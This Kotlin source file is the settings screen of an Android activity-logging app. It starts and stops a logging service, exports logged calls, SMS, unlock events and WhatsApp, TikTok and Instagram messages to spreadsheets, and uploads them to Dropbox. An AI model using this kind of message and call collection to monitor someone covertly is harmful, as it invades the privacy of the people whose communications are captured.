package com.logger.ui

import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import androidx.recyclerview.widget.LinearLayoutManager
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.logger.LoggerApp
import com.logger.R
import com.logger.data.SettingsManager
import com.logger.databinding.ActivitySettingsBinding
import com.logger.service.LoggerForegroundService
import com.logger.utils.CloudUploadHelper
import kotlinx.coroutines.launch
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import androidx.activity.result.contract.ActivityResultContracts
import com.google.android.material.datepicker.MaterialDatePicker
import jxl.Workbook
import jxl.write.Label
import jxl.write.WritableWorkbook
import java.util.Calendar
import java.util.Date
import java.text.SimpleDateFormat
import java.util.Locale
import android.net.Uri

class SettingsActivity : AppCompatActivity() {

    private lateinit var binding: ActivitySettingsBinding
    private lateinit var settingsManager: SettingsManager
    private lateinit var adapter: ExcludedPackageAdapter

    private var exportStart: Long = 0L
    private var exportEnd: Long = 0L

    private val exportLauncher = registerForActivityResult(ActivityResultContracts.CreateDocument("application/vnd.ms-excel")) { uri ->
        if (uri != null) {
            exportToExcel(uri)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            binding = ActivitySettingsBinding.inflate(layoutInflater)
            setContentView(binding.root)

            settingsManager = SettingsManager(this)

            setupToolbar()
            setupControls()
            setupIncludeList()
        } catch (e: Exception) {
            Toast.makeText(this, "Crash prevented! Error: ${e.message}", Toast.LENGTH_LONG).show()
            e.printStackTrace()
            // Finish to gracefully stop the crash loop
            finish()
        }
    }

    private fun setupToolbar() {
        setSupportActionBar(binding.toolbar)
        supportActionBar?.setDisplayHomeAsUpEnabled(true)
        supportActionBar?.title = "Settings"
    }

    override fun onSupportNavigateUp(): Boolean {
        finish()
        return true
    }

    private fun setupControls() {
        // Init state
        binding.switchService.isChecked = settingsManager.isLoggerEnabled

        binding.switchService.setOnCheckedChangeListener { _, isChecked ->
            settingsManager.isLoggerEnabled = isChecked
            if (isChecked) {
                LoggerForegroundService.start(this)
            } else {
                LoggerForegroundService.stop(this)
            }
        }

        binding.btnClearLogs.setOnClickListener {
            MaterialAlertDialogBuilder(this)
                .setTitle("Clear All Logs")
                .setMessage("Are you sure you want to delete all log entries? This cannot be undone.")
                .setPositiveButton("Clear") { _, _ ->
                    lifecycleScope.launch {
                        (application as LoggerApp).database.logDao().clearAllLogs()
                        Toast.makeText(this@SettingsActivity, "All logs cleared", Toast.LENGTH_SHORT).show()
                    }
                }
                .setNegativeButton("Cancel", null)
                .show()
        }

        binding.btnExportExcel.setOnClickListener {
            showDatePickerForExport()
        }

        binding.btnUploadCloud.setOnClickListener {
            showDatePickerForCloudSync()
        }
    }

    private fun setupIncludeList() {
        adapter = ExcludedPackageAdapter(settingsManager.getIncludedPackages().toList().sorted()) { pkgToRemove ->
            settingsManager.removeIncludedPackage(pkgToRemove)
            refreshList()
        }

        binding.recyclerViewExcluded.layoutManager = LinearLayoutManager(this)
        binding.recyclerViewExcluded.adapter = adapter

        binding.btnAddExcluded.setOnClickListener {
            val pkg = binding.inputExcludedPackage.text.toString().trim()
            if (pkg.isNotEmpty()) {
                settingsManager.addIncludedPackage(pkg)
                binding.inputExcludedPackage.text?.clear()
                refreshList()
            }
        }
    }

    private fun refreshList() {
        adapter.updateList(settingsManager.getIncludedPackages().toList().sorted())
    }

    private fun showDatePickerForExport() {
        val datePicker = MaterialDatePicker.Builder.dateRangePicker()
            .setTitleText("Select Date Range to Export")
            .build()
            
        datePicker.addOnPositiveButtonClickListener { selection ->
            // MaterialDatePicker returns UTC timestamps — convert to local timezone
            val startCalendar = Calendar.getInstance()
            startCalendar.timeInMillis = selection.first
            startCalendar.set(Calendar.HOUR_OF_DAY, 0)
            startCalendar.set(Calendar.MINUTE, 0)
            startCalendar.set(Calendar.SECOND, 0)
            startCalendar.set(Calendar.MILLISECOND, 0)
            exportStart = startCalendar.timeInMillis

            val endCalendar = Calendar.getInstance()
            endCalendar.timeInMillis = selection.second
            endCalendar.set(Calendar.HOUR_OF_DAY, 23)
            endCalendar.set(Calendar.MINUTE, 59)
            endCalendar.set(Calendar.SECOND, 59)
            exportEnd = endCalendar.timeInMillis
            
            val sdf = SimpleDateFormat("yyyyMMdd", Locale.getDefault())
            val dateStr = sdf.format(Date())
            exportLauncher.launch("Logger_Export_$dateStr.xls")
        }
        datePicker.show(supportFragmentManager, "EXPORT_DATE_PICKER")
    }

    private fun showDatePickerForCloudSync() {
        val datePicker = MaterialDatePicker.Builder.dateRangePicker()
            .setTitleText("Select Date Range for Cloud Upload")
            .build()
            
        datePicker.addOnPositiveButtonClickListener { selection ->
            // MaterialDatePicker returns UTC timestamps — convert to local timezone
            val startCalendar = Calendar.getInstance()
            startCalendar.timeInMillis = selection.first
            startCalendar.set(Calendar.HOUR_OF_DAY, 0)
            startCalendar.set(Calendar.MINUTE, 0)
            startCalendar.set(Calendar.SECOND, 0)
            startCalendar.set(Calendar.MILLISECOND, 0)
            val start = startCalendar.timeInMillis

            val endCalendar = Calendar.getInstance()
            endCalendar.timeInMillis = selection.second
            endCalendar.set(Calendar.HOUR_OF_DAY, 23)
            endCalendar.set(Calendar.MINUTE, 59)
            endCalendar.set(Calendar.SECOND, 59)
            val end = endCalendar.timeInMillis

            uploadToCloudSync(start, end)
        }
        datePicker.show(supportFragmentManager, "CLOUD_SYNC_DATE_PICKER")
    }

    private fun uploadToCloudSync(start: Long, end: Long) {
        lifecycleScope.launch {
            try {
                Toast.makeText(this@SettingsActivity, "Uploading to Dropbox...", Toast.LENGTH_SHORT).show()
                val logs = (application as LoggerApp).database.logDao().getAllLogsInRange(start, end)
                
                if (logs.isEmpty()) {
                    Toast.makeText(this@SettingsActivity, "No logs found for this date range.", Toast.LENGTH_LONG).show()
                    return@launch
                }
                
                withContext(Dispatchers.IO) {
                    val sdf = SimpleDateFormat("yyyy_MM_dd_HH_mm_ss", Locale.getDefault())
                    val dateStr = sdf.format(Date())
                    
                    val manufacturer = android.os.Build.MANUFACTURER.replace(" ", "_").replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.getDefault()) else it.toString() }
                    val model = android.os.Build.MODEL.replace(" ", "_")
                    val baseFileName = "Logger_ManualSync_${manufacturer}_${model}_$dateStr.xls"
                    
                    val tempFile = File(cacheDir, "Temp_$baseFileName")
                    
                    CloudUploadHelper.buildExcelFile(tempFile, logs)
                    CloudUploadHelper.uploadToDropbox(this@SettingsActivity, tempFile, baseFileName)
                    
                    tempFile.delete()
                }
                Toast.makeText(this@SettingsActivity, "Cloud Upload Successful!", Toast.LENGTH_LONG).show()
            } catch (e: Exception) {
                e.printStackTrace()
                Toast.makeText(this@SettingsActivity, "Upload Failed: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun exportToExcel(uri: Uri) {
        lifecycleScope.launch {
            try {
                Toast.makeText(this@SettingsActivity, "Exporting to Excel...", Toast.LENGTH_SHORT).show()
                val logs = (application as LoggerApp).database.logDao().getAllLogsInRange(exportStart, exportEnd)
                
                withContext(Dispatchers.IO) {
                    contentResolver.openOutputStream(uri)?.use { outputStream ->
                        val workbook = Workbook.createWorkbook(outputStream)
                        
                        val appLogs = logs.filter { it.eventType == com.logger.data.LogEntry.TYPE_APP_OPENED || it.eventType == com.logger.data.LogEntry.TYPE_APP_CLOSED || it.eventType == com.logger.data.LogEntry.TYPE_APP_FOCUS || it.eventType == com.logger.data.LogEntry.TYPE_AUTH_UNLOCK }
                        val callLogs = logs.filter { it.eventType == com.logger.data.LogEntry.TYPE_CALL_INCOMING }
                        val msgLogs = logs.filter { it.eventType == com.logger.data.LogEntry.TYPE_SMS_RECEIVED }
                        val waLogs = logs.filter { it.eventType == com.logger.data.LogEntry.TYPE_WHATSAPP_MSG || it.eventType == com.logger.data.LogEntry.TYPE_WHATSAPP_CALL }
                        val tiktokLogs = logs.filter { it.eventType == com.logger.data.LogEntry.TYPE_TIKTOK_MSG }
                        val instaLogs = logs.filter { it.eventType == com.logger.data.LogEntry.TYPE_INSTAGRAM_MSG }
                        
                        writeSheet(workbook, "App Activity", 0, appLogs)
                        writeSheet(workbook, "Calls", 1, callLogs)
                        writeSheet(workbook, "Messages", 2, msgLogs)
                        writeSheet(workbook, "WhatsApp", 3, waLogs)
                        writeSheet(workbook, "TikTok", 4, tiktokLogs)
                        writeSheet(workbook, "Instagram", 5, instaLogs)
                        
                        workbook.write()
                        workbook.close()
                    }
                }
                Toast.makeText(this@SettingsActivity, "Export Successful!", Toast.LENGTH_LONG).show()
            } catch (e: Exception) {
                e.printStackTrace()
                Toast.makeText(this@SettingsActivity, "Export Failed: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }
    }
    
    private fun writeSheet(workbook: WritableWorkbook, name: String, index: Int, logs: List<com.logger.data.LogEntry>) {
        val sheet = workbook.createSheet(name, index)
        val sdf = SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.getDefault())
        
        sheet.addCell(Label(0, 0, "Time"))
        sheet.addCell(Label(1, 0, "Event Type"))
        sheet.addCell(Label(2, 0, "Details"))
        sheet.addCell(Label(3, 0, "App / Content"))
        sheet.addCell(Label(4, 0, "Duration (s)"))
        
        for (i in logs.indices) {
            val log = logs[i]
            val row = i + 1
            sheet.addCell(Label(0, row, sdf.format(Date(log.timestamp))))
            sheet.addCell(Label(1, row, log.eventType))
            sheet.addCell(Label(2, row, log.details ?: ""))
            sheet.addCell(Label(3, row, log.appName ?: ""))
            sheet.addCell(Label(4, row, log.durationMillis?.let { (it / 1000.0).toString() } ?: ""))
        }
    }
}
